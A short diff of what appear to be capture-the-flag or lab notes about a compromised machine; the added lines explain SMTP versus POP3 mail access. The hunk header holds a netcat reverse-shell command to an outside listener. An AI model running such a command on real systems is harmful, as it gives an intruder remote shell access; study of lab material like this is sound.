@@ -156,7 +156,9 @@ nc -c bash 10.10.16.6 1234
 * The ability to telnet should be disabled. 
 * Research the `chroot` thing and why has it given me more privileges than normal mindy.
 
-
+* SMTP is a message transfer agent whereas POP3 is a message access agent.  
+* SMTP transfers mail from senders computer to the mail box present on receiver's mail server. POP3 it allows to retrieve and organize mails from mailbox on receiver mail server to receiver's computer.  
+* I think that's why I was able to view emails on the POP3 and not on the SMTP.
  
 
 
